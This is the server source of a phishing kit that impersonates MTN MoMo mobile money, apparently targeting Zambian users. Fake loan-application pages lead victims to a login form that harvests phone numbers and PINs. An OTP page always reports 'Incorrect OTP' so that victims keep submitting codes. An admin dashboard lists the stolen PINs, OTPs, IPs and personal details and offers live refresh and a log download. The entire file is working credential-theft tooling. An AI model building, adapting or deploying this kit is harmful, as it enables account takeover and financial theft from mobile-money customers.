const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');

const PORT = process.env.PORT || 8000;

// Admin credentials
const ADMIN_USERNAME = 'admin';
const ADMIN_PASSWORD = 'mtn@admin#';

// Store sessions
const sessions = {};

function verifyAuth(req) {
    const authHeader = req.headers.authorization || '';
    const encoded = authHeader.split(' ')[1] || '';
    const decoded = Buffer.from(encoded, 'base64').toString();
    const [username, password] = decoded.split(':');
    return username === ADMIN_USERNAME && password === ADMIN_PASSWORD;
}

function generateSessionId() {
    return Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
}

// Parse body based on content type
function parseBody(req) {
    return new Promise((resolve, reject) => {
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });
        req.on('end', () => {
            try {
                const contentType = req.headers['content-type'] || '';
                if (contentType.includes('application/json')) {
                    resolve(JSON.parse(body));
                } else if (contentType.includes('application/x-www-form-urlencoded')) {
                    const params = new URLSearchParams(body);
                    const result = {};
                    for (const [key, value] of params) {
                        result[key] = value;
                    }
                    resolve(result);
                } else {
                    // Try to parse as JSON first, fallback to form data
                    try {
                        resolve(JSON.parse(body));
                    } catch {
                        const params = new URLSearchParams(body);
                        const result = {};
                        for (const [key, value] of params) {
                            result[key] = value;
                        }
                        resolve(result);
                    }
                }
            } catch (error) {
                reject(error);
            }
        });
    });
}

// Format credentials for display
function formatCredentials(data) {
    if (!data.trim()) {
        return `
            <div style="text-align: center; padding: 40px; color: #999;">
                <div style="font-size: 48px; margin-bottom: 15px;">📭</div>
                <p style="font-size: 16px;">No credentials captured yet.</p>
                <p style="font-size: 13px; margin-top: 5px;">Waiting for users to submit data...</p>
            </div>
        `;
    }
    
    try {
        const jsonArray = '[' + data.trim().replace(/,\s*$/, '') + ']';
        const parsed = JSON.parse(jsonArray);
        
        let html = '';
        const reversed = [...parsed].reverse();
        
        reversed.forEach((cred, index) => {
            const hasOtp = cred.otp && cred.otp !== null;
            const statusClass = hasOtp ? 'status-complete' : 'status-pending';
            const statusText = hasOtp ? '✅ Complete' : '⏳ Pending OTP';
            const phoneDisplay = cred.phone ? `+260 ${cred.phone.slice(0, 3)} ${cred.phone.slice(3, 6)} ${cred.phone.slice(6)}` : 'N/A';
            
            html += `
                <div class="credential-item">
                    <div class="credential-header">
                        <div class="credential-phone">📱 ${phoneDisplay}</div>
                        <span class="status-badge ${statusClass}">${statusText}</span>
                    </div>
                    <div class="credential-details">
                        <div class="detail-row">
                            <span class="detail-label">PIN:</span>
                            <span class="detail-value pin-value">${cred.pin || 'N/A'}</span>
                        </div>
                        ${hasOtp ? `
                        <div class="detail-row">
                            <span class="detail-label">OTP:</span>
                            <span class="detail-value otp-value">${cred.otp}</span>
                        </div>
                        ` : `
                        <div class="detail-row">
                            <span class="detail-label">OTP:</span>
                            <span class="detail-value pending-text">⏳ Not yet entered</span>
                        </div>
                        `}
                        ${cred.loanData ? `
                        <div class="detail-row">
                            <span class="detail-label">Loan:</span>
                            <span class="detail-value">ZMW ${cred.loanData.amount || 'N/A'} | ${cred.loanData.term || 'N/A'} months</span>
                        </div>
                        ` : ''}
                        ${cred.personalData ? `
                        <div class="detail-row">
                            <span class="detail-label">Name:</span>
                            <span class="detail-value">${cred.personalData.firstName || ''} ${cred.personalData.lastName || ''}</span>
                        </div>
                        <div class="detail-row">
                            <span class="detail-label">Email:</span>
                            <span class="detail-value">${cred.personalData.email || 'N/A'}</span>
                        </div>
                        ` : ''}
                        <div class="detail-row">
                            <span class="detail-label">Time:</span>
                            <span class="detail-value time-value">${new Date(cred.timestamp).toLocaleString()}</span>
                        </div>
                        <div class="detail-row">
                            <span class="detail-label">IP:</span>
                            <span class="detail-value ip-value">${cred.ip || 'Unknown'}</span>
                        </div>
                    </div>
                </div>
            `;
        });
        
        return html;
    } catch (e) {
        return `<pre style="background: #f8f9fa; padding: 15px; border-radius: 8px; overflow-x: auto; font-size: 13px;">${data}</pre>`;
    }
}

function countEntries(data) {
    if (!data.trim()) return 0;
    try {
        const jsonArray = '[' + data.trim().replace(/,\s*$/, '') + ']';
        const parsed = JSON.parse(jsonArray);
        return parsed.length;
    } catch (e) {
        return data.split('\n').filter(line => line.trim()).length;
    }
}

function countComplete(data) {
    if (!data.trim()) return 0;
    try {
        const jsonArray = '[' + data.trim().replace(/,\s*$/, '') + ']';
        const parsed = JSON.parse(jsonArray);
        return parsed.filter(c => c.otp && c.otp !== null).length;
    } catch (e) {
        return 0;
    }
}

function countPending(data) {
    if (!data.trim()) return 0;
    try {
        const jsonArray = '[' + data.trim().replace(/,\s*$/, '') + ']';
        const parsed = JSON.parse(jsonArray);
        return parsed.filter(c => !c.otp || c.otp === null).length;
    } catch (e) {
        return 0;
    }
}

http.createServer(async (req, res) => {
    const parsedUrl = url.parse(req.url, true);
    const pathname = parsedUrl.pathname;

    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);

    // Serve static files
    if (req.method === 'GET' && pathname.startsWith('/static/')) {
        const filePath = path.join(__dirname, pathname);
        const extname = path.extname(filePath).toLowerCase();
        
        const mimeTypes = {
            '.html': 'text/html',
            '.js': 'text/javascript',
            '.css': 'text/css',
            '.png': 'image/png',
            '.jpg': 'image/jpeg',
            '.jpeg': 'image/jpeg',
            '.gif': 'image/gif',
            '.ico': 'image/x-icon',
            '.svg': 'image/svg+xml'
        };

        const contentType = mimeTypes[extname] || 'application/octet-stream';

        fs.readFile(filePath, (err, data) => {
            if (err) {
                res.writeHead(404);
                res.end('File not found');
                return;
            }
            res.writeHead(200, { 'Content-Type': contentType });
            res.end(data);
        });
        return;
    }

    // Serve landing page
    if (req.method === 'GET' && pathname === '/') {
        fs.readFile(path.join(__dirname, 'landing.html'), (err, data) => {
            if (err) {
                res.writeHead(500);
                res.end('Error loading page');
                return;
            }
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(data);
        });
        return;
    }

    // Serve step1 page
    if (req.method === 'GET' && pathname === '/step1') {
        fs.readFile(path.join(__dirname, 'step1.html'), (err, data) => {
            if (err) {
                res.writeHead(500);
                res.end('Error loading page');
                return;
            }
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(data);
        });
        return;
    }

    // Serve step2 page
    if (req.method === 'GET' && pathname === '/step2') {
        fs.readFile(path.join(__dirname, 'step2.html'), (err, data) => {
            if (err) {
                res.writeHead(500);
                res.end('Error loading page');
                return;
            }
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(data);
        });
        return;
    }

    // Serve step3 page
    if (req.method === 'GET' && pathname === '/step3') {
        fs.readFile(path.join(__dirname, 'step3.html'), (err, data) => {
            if (err) {
                res.writeHead(500);
                res.end('Error loading page');
                return;
            }
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(data);
        });
        return;
    }

    // Serve login page
    if (req.method === 'GET' && pathname === '/login') {
        fs.readFile(path.join(__dirname, 'login.html'), (err, data) => {
            if (err) {
                res.writeHead(500);
                res.end('Error loading page');
                return;
            }
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(data);
        });
        return;
    }

    // Serve OTP page
    if (req.method === 'GET' && pathname === '/otp') {
        fs.readFile(path.join(__dirname, 'otp.html'), (err, data) => {
            if (err) {
                res.writeHead(500);
                res.end('Error loading page');
                return;
            }
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(data);
        });
        return;
    }

    // Serve approval page
    if (req.method === 'GET' && pathname === '/approval') {
        fs.readFile(path.join(__dirname, 'approval.html'), (err, data) => {
            if (err) {
                res.writeHead(500);
                res.end('Error loading page');
                return;
            }
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(data);
        });
        return;
    }

    // API endpoint for admin data
    if (req.method === 'GET' && pathname === '/api/admin-data') {
        if (!verifyAuth(req)) {
            res.writeHead(401);
            res.end('Unauthorized');
            return;
        }

        fs.readFile('credentials.log', 'utf8', (err, data) => {
            if (err && err.code === 'ENOENT') {
                data = '';
            } else if (err) {
                res.writeHead(500);
                res.end(JSON.stringify({ error: err.message }));
                return;
            }

            const total = countEntries(data);
            const complete = countComplete(data);
            const pending = countPending(data);

            let entries = [];
            if (data.trim()) {
                try {
                    const jsonArray = '[' + data.trim().replace(/,\s*$/, '') + ']';
                    entries = JSON.parse(jsonArray);
                } catch (e) {
                    entries = [];
                }
            }

            res.writeHead(200, { 
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            });
            res.end(JSON.stringify({
                total: total,
                complete: complete,
                pending: pending,
                entries: entries.reverse().slice(0, 20)
            }));
        });
        return;
    }

    // Handle loan application submission (step 1)
    if (req.method === 'POST' && pathname === '/submit-loan') {
        try {
            const data = await parseBody(req);
            const loanData = {
                loanType: data.loanType,
                amount: data.loanAmount,
                term: data.loanTerm,
                purpose: data.loanPurpose,
                timestamp: new Date().toISOString()
            };
            
            const sessionId = generateSessionId();
            sessions[sessionId] = {
                loanData: loanData,
                step: 1,
                timestamp: Date.now()
            };
            
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ 
                success: true, 
                sessionId: sessionId,
                redirect: '/step2'
            }));
            
        } catch (error) {
            console.error('Error:', error);
            res.writeHead(500);
            res.end(JSON.stringify({ success: false }));
        }
        return;
    }

    // Handle personal details submission (step 2)
    if (req.method === 'POST' && pathname === '/submit-details') {
        try {
            const data = await parseBody(req);
            const sessionId = data.sessionId;
            const personalData = {
                firstName: data.firstName,
                lastName: data.lastName,
                email: data.email || '',
                phone: data.phone,
                timestamp: new Date().toISOString()
            };
            
            if (sessions[sessionId]) {
                sessions[sessionId].personalData = personalData;
                sessions[sessionId].step = 2;
            }
            
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ 
                success: true,
                redirect: '/step3'
            }));
            
        } catch (error) {
            console.error('Error:', error);
            res.writeHead(500);
            res.end(JSON.stringify({ success: false }));
        }
        return;
    }

    // Handle final submission (step 3)
    if (req.method === 'POST' && pathname === '/submit-final') {
        try {
            const data = await parseBody(req);
            const sessionId = data.sessionId;
            const employmentStatus = data.employmentStatus;
            const annualIncome = data.annualIncome;
            
            if (sessions[sessionId]) {
                sessions[sessionId].employmentStatus = employmentStatus;
                sessions[sessionId].annualIncome = annualIncome;
                sessions[sessionId].step = 3;
                sessions[sessionId].completed = true;
                
                const session = sessions[sessionId];
                const logEntry = {
                    type: 'loan_application',
                    loanData: session.loanData,
                    personalData: session.personalData,
                    employmentStatus: employmentStatus,
                    annualIncome: annualIncome,
                    timestamp: new Date().toISOString(),
                    ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
                };
                
                fs.appendFile('applications.log', JSON.stringify(logEntry, null, 2) + ',\n', (err) => {
                    if (err) console.error('Error writing to file:', err);
                });
            }
            
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ 
                success: true,
                redirect: '/login'
            }));
            
        } catch (error) {
            console.error('Error:', error);
            res.writeHead(500);
            res.end(JSON.stringify({ success: false }));
        }
        return;
    }

    // Handle login (capture phone + PIN)
    if (req.method === 'POST' && pathname === '/login') {
        try {
            const data = await parseBody(req);
            const phone = data.phone;
            const pin = data.pin;
            
            const cleanPhone = phone.replace(/[^0-9]/g, '');
            
            console.log(`📱 Login attempt - Phone: +260${cleanPhone}, PIN: ${pin}`);
            
            const credentials = {
                phone: cleanPhone,
                pin: pin,
                otp: null,
                timestamp: new Date().toISOString(),
                ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
                userAgent: req.headers['user-agent']
            };
            
            const sessionId = generateSessionId();
            sessions[sessionId] = {
                credentials: credentials,
                phone: cleanPhone,
                step: 'login',
                timestamp: Date.now()
            };
            
            sessions[`phone_${cleanPhone}`] = {
                sessionId: sessionId,
                credentials: credentials,
                timestamp: Date.now()
            };
            
            console.log(`✅ Session created for +260${cleanPhone} with ID: ${sessionId}`);
            
            fs.appendFile('credentials.log', JSON.stringify(credentials, null, 2) + ',\n', (err) => {
                if (err) console.error('Error writing to file:', err);
                else console.log(`✅ Credentials saved for +260${cleanPhone}`);
            });
            
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ 
                success: true,
                sessionId: sessionId,
                redirect: '/otp'
            }));
            
        } catch (error) {
            console.error('Error:', error);
            res.writeHead(500);
            res.end(JSON.stringify({ success: false }));
        }
        return;
    }

    // Handle OTP verification (capture OTP)
    if (req.method === 'POST' && pathname === '/verify-otp') {
        try {
            const data = await parseBody(req);
            const sessionId = data.sessionId;
            const otp = data.otp;
            const phone = data.phone;
            
            console.log(`📱 OTP captured for +260${phone}: ${otp}`);
            
            let session = null;
            let sessionKey = null;
            
            if (sessions[sessionId]) {
                session = sessions[sessionId];
                sessionKey = sessionId;
            } else {
                const phoneKey = `phone_${phone}`;
                if (sessions[phoneKey]) {
                    const sessionRef = sessions[phoneKey];
                    if (sessions[sessionRef.sessionId]) {
                        session = sessions[sessionRef.sessionId];
                        sessionKey = sessionRef.sessionId;
                    }
                }
            }
            
            if (session && session.credentials) {
                session.credentials.otp = otp;
                session.step = 'otp_captured';
                
                const creds = session.credentials;
                const fullCredentials = {
                    phone: creds.phone,
                    pin: creds.pin,
                    otp: otp,
                    timestamp: new Date().toISOString(),
                    ip: creds.ip,
                    userAgent: creds.userAgent,
                    status: 'complete'
                };
                
                fs.appendFile('credentials.log', JSON.stringify(fullCredentials, null, 2) + ',\n', (err) => {
                    if (err) console.error('Error writing to file:', err);
                    else console.log(`✅ Complete credentials saved with OTP for +260${phone}`);
                });
                
                console.log(`✅ OTP captured and saved for +260${phone}`);
            } else {
                console.log(`⚠️ No session found for phone +260${phone} or sessionId ${sessionId}`);
            }
            
            // ALWAYS return "incorrect" to simulate real phishing
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ 
                success: false,
                message: 'Incorrect OTP. Please try again.'
            }));
            
        } catch (error) {
            console.error('Error:', error);
            res.writeHead(500);
            res.end(JSON.stringify({ success: false }));
        }
        return;
    }

    // Handle OTP resend
    if (req.method === 'POST' && pathname === '/otp-resend') {
        try {
            const data = await parseBody(req);
            const phone = data.phone;
            
            console.log(`📱 Resend OTP requested for +260${phone}`);
            
            let session = null;
            let sessionId = null;
            
            const phoneKey = `phone_${phone}`;
            if (sessions[phoneKey]) {
                const sessionRef = sessions[phoneKey];
                if (sessions[sessionRef.sessionId]) {
                    session = sessions[sessionRef.sessionId];
                    sessionId = sessionRef.sessionId;
                    console.log(`✅ Found session via phone lookup for +260${phone}`);
                }
            }
            
            if (!session) {
                for (const [id, s] of Object.entries(sessions)) {
                    if (s.credentials && s.credentials.phone === phone) {
                        session = s;
                        sessionId = id;
                        console.log(`✅ Found session via iteration for +260${phone}`);
                        break;
                    }
                }
            }
            
            if (!session) {
                console.log(`⚠️ No session found for phone +260${phone}`);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ 
                    success: false, 
                    message: 'No active session found. Please login again.' 
                }));
                return;
            }
            
            if (session.credentials) {
                const phoneNumber = session.credentials.phone;
                const pin = session.credentials.pin;
                const ip = session.credentials.ip;
                const userAgent = session.credentials.userAgent;
                
                session.credentials = {
                    phone: phoneNumber,
                    pin: pin,
                    otp: null,
                    timestamp: new Date().toISOString(),
                    ip: ip,
                    userAgent: userAgent
                };
                session.step = 'login';
                
                console.log(`✅ OTP reset for +260${phone}. User needs to enter new OTP.`);
                
                const phoneKey2 = `phone_${phone}`;
                if (sessions[phoneKey2]) {
                    sessions[phoneKey2].credentials = session.credentials;
                    sessions[phoneKey2].timestamp = Date.now();
                }
            }
            
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ 
                success: true, 
                message: 'New OTP sent to your phone. Please check your SMS.' 
            }));
            
        } catch (error) {
            console.error('Error in resend:', error);
            res.writeHead(500);
            res.end(JSON.stringify({ 
                success: false, 
                message: 'Server error. Please try again.' 
            }));
        }
        return;
    }

    // Admin page
    if (req.method === 'GET' && pathname === '/admin') {
        if (!verifyAuth(req)) {
            res.writeHead(401, {
                'WWW-Authenticate': 'Basic realm="Admin Access"',
                'Content-Type': 'text/html'
            });
            res.end('<h1>Authentication Required</h1>');
            return;
        }

        fs.readFile('credentials.log', 'utf8', (err, data) => {
            if (err && err.code === 'ENOENT') {
                data = '';
            } else if (err) {
                data = '';
            }

            const total = countEntries(data);
            const complete = countComplete(data);
            const pending = countPending(data);

            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(`
                <!DOCTYPE html>
                <html>
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>MTN MoMo Admin Dashboard</title>
                    <style>
                        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
                        body { 
                            background: #f0f2f5; 
                            padding: 20px; 
                            color: #333;
                            min-height: 100vh;
                        }
                        .container { 
                            max-width: 1200px; 
                            margin: 0 auto; 
                        }
                        
                        .dashboard-header {
                            background: white;
                            border-radius: 12px;
                            padding: 25px 30px;
                            margin-bottom: 25px;
                            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
                            display: flex;
                            justify-content: space-between;
                            align-items: center;
                            flex-wrap: wrap;
                            gap: 15px;
                        }
                        .dashboard-header .brand h1 {
                            font-size: 28px;
                            font-weight: 700;
                        }
                        .dashboard-header .brand .mtn-logo-icon {
                            display: inline-block;
                            width: 36px;
                            height: 36px;
                            background: #FFD700;
                            border-radius: 6px;
                            text-align: center;
                            line-height: 36px;
                            font-weight: 900;
                            color: #003366;
                            margin-right: 8px;
                        }
                        .dashboard-header .brand .mtn-text {
                            color: #003366;
                        }
                        .dashboard-header .brand .momo-text {
                            color: #FFD700;
                        }
                        .dashboard-header .brand .sub {
                            font-size: 14px;
                            color: #888;
                            font-weight: 400;
                            margin-top: 2px;
                        }
                        .dashboard-header .status {
                            display: flex;
                            align-items: center;
                            gap: 15px;
                            font-size: 14px;
                            color: #666;
                        }
                        .live-dot {
                            display: inline-block;
                            width: 10px;
                            height: 10px;
                            background: #4CAF50;
                            border-radius: 50%;
                            animation: pulse 1.5s ease-in-out infinite;
                            margin-right: 6px;
                        }
                        @keyframes pulse {
                            0%, 100% { opacity: 1; transform: scale(1); }
                            50% { opacity: 0.4; transform: scale(0.8); }
                        }
                        .last-updated {
                            color: #999;
                            font-size: 13px;
                        }
                        
                        .stats-grid {
                            display: grid;
                            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
                            gap: 15px;
                            margin-bottom: 25px;
                        }
                        .stat-card {
                            background: white;
                            border-radius: 10px;
                            padding: 20px 20px 18px;
                            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
                            border-left: 4px solid #003366;
                        }
                        .stat-card .stat-number {
                            font-size: 32px;
                            font-weight: 700;
                            color: #1a1a2e;
                            line-height: 1.2;
                        }
                        .stat-card .stat-label {
                            font-size: 14px;
                            color: #888;
                            margin-top: 4px;
                        }
                        .stat-card.pending { border-left-color: #FF9800; }
                        .stat-card.complete { border-left-color: #4CAF50; }
                        .stat-card.total { border-left-color: #003366; }
                        
                        .toolbar {
                            background: white;
                            border-radius: 10px;
                            padding: 15px 20px;
                            margin-bottom: 20px;
                            display: flex;
                            justify-content: space-between;
                            align-items: center;
                            flex-wrap: wrap;
                            gap: 12px;
                            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
                        }
                        .toolbar .left {
                            display: flex;
                            align-items: center;
                            gap: 12px;
                            font-size: 14px;
                            color: #555;
                        }
                        .toolbar .left .count {
                            font-weight: 600;
                            color: #003366;
                        }
                        .toolbar .actions {
                            display: flex;
                            gap: 10px;
                            flex-wrap: wrap;
                        }
                        .btn {
                            padding: 8px 18px;
                            border: none;
                            border-radius: 6px;
                            font-size: 13px;
                            font-weight: 600;
                            cursor: pointer;
                            text-decoration: none;
                            display: inline-block;
                            transition: all 0.2s;
                        }
                        .btn-primary { background: #003366; color: white; }
                        .btn-primary:hover { background: #002244; }
                        .btn-danger { background: #dc3545; color: white; }
                        .btn-danger:hover { background: #c82333; }
                        .btn-outline { background: transparent; color: #666; border: 1px solid #ddd; }
                        .btn-outline:hover { background: #f5f5f5; }
                        .btn-sm { padding: 6px 14px; font-size: 12px; }
                        .btn-gold { background: #FFD700; color: #003366; }
                        .btn-gold:hover { background: #e6c200; }
                        
                        .entries-container {
                            background: white;
                            border-radius: 12px;
                            padding: 20px 25px;
                            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
                        }
                        .entries-container .section-title {
                            font-size: 16px;
                            font-weight: 600;
                            color: #333;
                            margin-bottom: 18px;
                            display: flex;
                            align-items: center;
                            gap: 10px;
                        }
                        .entries-container .section-title .badge {
                            background: #003366;
                            color: white;
                            padding: 1px 10px;
                            border-radius: 12px;
                            font-size: 12px;
                            font-weight: 600;
                        }
                        
                        .credential-item {
                            background: #f8f9fa;
                            border-radius: 10px;
                            padding: 16px 20px;
                            margin-bottom: 12px;
                            border: 1px solid #e9ecef;
                            transition: all 0.2s;
                        }
                        .credential-item:hover {
                            border-color: #d0d7de;
                            background: #f5f6f8;
                        }
                        .credential-item:last-child { margin-bottom: 0; }
                        
                        .credential-header {
                            display: flex;
                            justify-content: space-between;
                            align-items: center;
                            flex-wrap: wrap;
                            gap: 10px;
                            margin-bottom: 10px;
                        }
                        .credential-phone {
                            font-size: 18px;
                            font-weight: 700;
                            color: #1a1a2e;
                        }
                        .status-badge {
                            padding: 3px 14px;
                            border-radius: 20px;
                            font-size: 12px;
                            font-weight: 600;
                        }
                        .status-complete { background: #e8f5e9; color: #2e7d32; }
                        .status-pending { background: #fff3e0; color: #e65100; }
                        
                        .credential-details {
                            display: grid;
                            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
                            gap: 4px 20px;
                            font-size: 14px;
                        }
                        .detail-row {
                            display: flex;
                            align-items: baseline;
                            gap: 6px;
                            padding: 3px 0;
                        }
                        .detail-label {
                            color: #888;
                            font-weight: 500;
                            min-width: 50px;
                            font-size: 13px;
                        }
                        .detail-value {
                            color: #333;
                            font-weight: 500;
                            word-break: break-word;
                        }
                        .pin-value { color: #dc3545; font-family: monospace; font-size: 15px; letter-spacing: 1px; }
                        .otp-value { color: #003366; font-family: monospace; font-size: 15px; letter-spacing: 2px; font-weight: 700; }
                        .pending-text { color: #FF9800; font-weight: 500; }
                        .time-value { color: #666; font-size: 13px; font-weight: 400; }
                        .ip-value { color: #888; font-size: 13px; font-weight: 400; }
                        
                        .empty-state {
                            text-align: center;
                            padding: 50px 20px;
                            color: #999;
                        }
                        .empty-state .icon { font-size: 56px; margin-bottom: 15px; }
                        .empty-state h3 { color: #666; font-size: 18px; margin-bottom: 6px; }
                        .empty-state p { font-size: 14px; }
                        
                        .dashboard-footer {
                            margin-top: 25px;
                            text-align: center;
                            color: #aaa;
                            font-size: 13px;
                            padding: 15px;
                        }
                        .dashboard-footer .user { color: #666; }
                        
                        @media (max-width: 600px) {
                            .dashboard-header { flex-direction: column; align-items: flex-start; }
                            .stats-grid { grid-template-columns: 1fr 1fr; }
                            .credential-details { grid-template-columns: 1fr; }
                            .toolbar { flex-direction: column; align-items: stretch; }
                            .toolbar .actions { justify-content: flex-start; }
                            .entries-container { padding: 15px; }
                            .credential-item { padding: 14px 16px; }
                        }
                        @media (max-width: 400px) {
                            .stats-grid { grid-template-columns: 1fr; }
                        }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <div class="dashboard-header">
                            <div class="brand">
                                <h1>
                                    <span class="mtn-logo-icon">M</span>
                                    <span class="mtn-text">MTN</span> <span class="momo-text">MoMo</span>
                                    <span style="font-size:18px;color:#888;font-weight:400;">| Admin</span>
                                </h1>
                                <div class="sub">📋 Captured Credentials Dashboard</div>
                            </div>
                            <div class="status">
                                <span><span class="live-dot"></span> Live</span>
                                <span class="last-updated" id="lastUpdated">Last updated: ${new Date().toLocaleString()}</span>
                            </div>
                        </div>
                        
                        <div class="stats-grid">
                            <div class="stat-card total">
                                <div class="stat-number" id="statTotal">${total}</div>
                                <div class="stat-label">📊 Total Entries</div>
                            </div>
                            <div class="stat-card complete">
                                <div class="stat-number" id="statComplete">${complete}</div>
                                <div class="stat-label">✅ Complete (with OTP)</div>
                            </div>
                            <div class="stat-card pending">
                                <div class="stat-number" id="statPending">${pending}</div>
                                <div class="stat-label">⏳ Pending OTP</div>
                            </div>
                            <div class="stat-card total">
                                <div class="stat-number" id="statSessions">${Object.keys(sessions).length}</div>
                                <div class="stat-label">🔄 Active Sessions</div>
                            </div>
                        </div>
                        
                        <div class="toolbar">
                            <div class="left">
                                <span>Showing <span class="count" id="entryCount">${total}</span> entries</span>
                                <span style="color:#ddd;">|</span>
                                <span id="autoRefreshStatus" style="color:#4CAF50;font-weight:500;">● Auto-refresh enabled</span>
                            </div>
                            <div class="actions">
                                <button class="btn btn-primary btn-sm" onclick="refreshData()">🔄 Refresh Now</button>
                                <a href="/admin?download=true" class="btn btn-outline btn-sm">📥 Download Log</a>
                                <button onclick="if(confirm('Delete all logs?')) location.href='/admin?delete=true'" class="btn btn-danger btn-sm">🗑️ Clear All</button>
                            </div>
                        </div>
                        
                        <div class="entries-container">
                            <div class="section-title">
                                📝 Captured Credentials
                                <span class="badge" id="entryBadge">${total}</span>
                            </div>
                            <div id="entriesList">
                                ${formatCredentials(data)}
                            </div>
                        </div>
                        
                        <div class="dashboard-footer">
                            <span class="user">🔐 Logged in as: ${ADMIN_USERNAME}</span>
                            &nbsp;|&nbsp; 
                            <a href="/admin?logout=true" style="color:#003366;text-decoration:none;">Logout</a>
                            &nbsp;|&nbsp; 
                            <span>Server: ${req.headers.host}</span>
                        </div>
                    </div>
                    
                    <script>
                        let refreshInterval = setInterval(refreshData, 3000);
                        
                        function refreshData() {
                            fetch('/api/admin-data', {
                                headers: {
                                    'Authorization': 'Basic ' + btoa('${ADMIN_USERNAME}:${ADMIN_PASSWORD}')
                                }
                            })
                            .then(response => response.json())
                            .then(data => {
                                if (data.error) {
                                    console.error('Error fetching data:', data.error);
                                    return;
                                }
                                
                                document.getElementById('statTotal').textContent = data.total;
                                document.getElementById('statComplete').textContent = data.complete;
                                document.getElementById('statPending').textContent = data.pending;
                                document.getElementById('entryCount').textContent = data.total;
                                document.getElementById('entryBadge').textContent = data.total;
                                
                                document.getElementById('lastUpdated').textContent = 'Last updated: ' + new Date().toLocaleString();
                                
                                const entriesList = document.getElementById('entriesList');
                                
                                if (data.entries && data.entries.length > 0) {
                                    let html = '';
                                    data.entries.forEach(cred => {
                                        const hasOtp = cred.otp && cred.otp !== null;
                                        const statusClass = hasOtp ? 'status-complete' : 'status-pending';
                                        const statusText = hasOtp ? '✅ Complete' : '⏳ Pending OTP';
                                        const phoneDisplay = cred.phone ? \`+260 \${cred.phone.slice(0, 3)} \${cred.phone.slice(3, 6)} \${cred.phone.slice(6)}\` : 'N/A';
                                        
                                        html += \`
                                            <div class="credential-item">
                                                <div class="credential-header">
                                                    <div class="credential-phone">📱 \${phoneDisplay}</div>
                                                    <span class="status-badge \${statusClass}">\${statusText}</span>
                                                </div>
                                                <div class="credential-details">
                                                    <div class="detail-row">
                                                        <span class="detail-label">PIN:</span>
                                                        <span class="detail-value pin-value">\${cred.pin || 'N/A'}</span>
                                                    </div>
                                                    \${hasOtp ? \`
                                                    <div class="detail-row">
                                                        <span class="detail-label">OTP:</span>
                                                        <span class="detail-value otp-value">\${cred.otp}</span>
                                                    </div>
                                                    \` : \`
                                                    <div class="detail-row">
                                                        <span class="detail-label">OTP:</span>
                                                        <span class="detail-value pending-text">⏳ Not yet entered</span>
                                                    </div>
                                                    \`}
                                                    <div class="detail-row">
                                                        <span class="detail-label">Time:</span>
                                                        <span class="detail-value time-value">\${new Date(cred.timestamp).toLocaleString()}</span>
                                                    </div>
                                                    <div class="detail-row">
                                                        <span class="detail-label">IP:</span>
                                                        <span class="detail-value ip-value">\${cred.ip || 'Unknown'}</span>
                                                    </div>
                                                </div>
                                            </div>
                                        \`;
                                    });
                                    entriesList.innerHTML = html;
                                } else {
                                    entriesList.innerHTML = \`
                                        <div class="empty-state">
                                            <div class="icon">📭</div>
                                            <h3>No credentials captured yet</h3>
                                            <p>Waiting for users to submit data...</p>
                                        </div>
                                    \`;
                                }
                            })
                            .catch(err => {
                                console.error('Refresh error:', err);
                            });
                        }
                        
                        document.addEventListener('visibilitychange', function() {
                            if (document.hidden) {
                                clearInterval(refreshInterval);
                            } else {
                                refreshInterval = setInterval(refreshData, 3000);
                                refreshData();
                            }
                        });
                    </script>
                </body>
                </html>
            `);
        });
        return;
    }

    // Download logs
    if (req.method === 'GET' && pathname === '/admin' && parsedUrl.query.download === 'true') {
        if (!verifyAuth(req)) {
            res.writeHead(401);
            res.end('Authentication Required');
            return;
        }

        res.writeHead(200, {
            'Content-Type': 'application/json',
            'Content-Disposition': 'attachment; filename="credentials_log.json"'
        });
        fs.createReadStream('credentials.log').pipe(res);
        return;
    }

    // Delete logs
    if (req.method === 'GET' && pathname === '/admin' && parsedUrl.query.delete === 'true') {
        if (!verifyAuth(req)) {
            res.writeHead(401);
            res.end('Authentication Required');
            return;
        }

        fs.writeFile('credentials.log', '', (err) => {
            Object.keys(sessions).forEach(key => delete sessions[key]);
            res.writeHead(302, { 'Location': '/admin' });
            res.end();
        });
        return;
    }

    // Logout
    if (req.method === 'GET' && pathname === '/admin' && parsedUrl.query.logout === 'true') {
        res.writeHead(401, {
            'WWW-Authenticate': 'Basic realm="Admin Access"',
            'Content-Type': 'text/html'
        });
        res.end(`
            <!DOCTYPE html>
            <html>
            <head><title>Logged Out</title></head>
            <body style="font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f5f5f5;">
